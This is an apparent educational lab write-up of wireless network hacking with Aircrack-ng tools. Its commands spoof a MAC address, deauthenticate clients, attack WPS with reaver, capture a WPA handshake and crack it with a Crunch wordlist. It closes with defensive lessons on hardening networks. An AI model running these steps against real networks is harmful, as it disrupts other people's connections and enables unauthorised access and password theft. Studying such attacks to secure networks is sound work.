# Network Hacking

## Objective
To learn how malicious hackers hack wired or wireless network and steal information for educational purpose. 

## Tools Used
- Aircrack-NG
- Crunch

## Steps Performed
### Pre-connection Attacks
1. Bring down my machine interface to change the MAC address
   
- ifconfig wlan0 down
- ifconfig wlan0 hw ether **new mac address**
- ifconfig wlan0 up ✅

2.Set my adapter to monitor mode

- iwconfig
- ifconfig wlan0 down
- aimon-ng check kill
- iwconfig wlan0 mode monitor
- ifconfig wlan0 up  ✅

3. Run airodump-ng to sniff and capture packets sent to and from the target access point
   
- iwconfig
- airodump-ng **int name**
- airodump-ng --band a wlan0
- airodump-ng --bssid **value** --channel **value** --write **output file** wlan0  ✅

4. Disconnect a device from the target network

- aireplay-ng --deauth 1000000 -a **access point mac** -c **victim Mac** wlan0  ❌

## Gaining Access
5. View all networks with WPS enabled
- wash --interface wlan0 ✅
### Screenshot
![Wash command](../screenshots/wash-command.png)

6. Associate with the network
- reaver --bssid **AP bssid** --channel **AP channel** --interface wlan0 -vvv --no-associate
- aireplay-ng --fakeauth 30 -a **AP bssid** -h **device mac** wlan0
### Screenshot
![Reaver](../screenshots/reaver.png)
### Screenshot2
![Reaver2](../screenshots/reaver2.png)

**NOTE:** If WPS is disabled on the target network, or if it's enabled, but configured to use push button or PBC, then I will have to hack WPA/WPA2 with a wordlist(Using Handshake).                        *This is where actual work starts*

7. Run airodump-ng to see all the networks around.

- airodump-ng wlan0
### Screenshot
![Airodump](../screenshots/airodump.png)

8. Run airodump-ng on the target AP and store the data in a file
- airodump-ng --bssid **target AP mac** --channel **target AP channel** --write wpa_handshake wlan0
### Screenshot
![Airodump](../screenshots/airodump2.png)

9. Disconnect a client from the network in order to capture the handshake when the client tries to reconnect
   
- aireplay-ng --deauth 4 -a **target Ap mac** -c **target client mac** wlan0. *The command may fail if it's waiting on the wrong channel*
### Screenshot
![Airplay](../screenshots/airplay-ng.png)

The handshake will be received once the client reconnects
### Screenshot
![Handshake](../screenshots/handshake.png)
**NOTE:**  The handshake does not contain any information that can help to recover or recalculate the WPA key. The information in it can only be used to check whether a password is valid or not.

10. Create a wordlist using crunch
### Screenshot
![crunch](../screenshots/crunch.png)

11. To do the cracking, use Aircrack-ng to unpack the handshake and extract the useful information.
- aircrack-ng wpa_handshake.cap -w **wordlist file.txt**
### Screenshot
![Wordlist](../screenshots/wordlist.png)


## What I Learned
- How to identify Weak network and harden it
- Importance of strong authentication in wireless network
- The need to segregate guest network from the main network

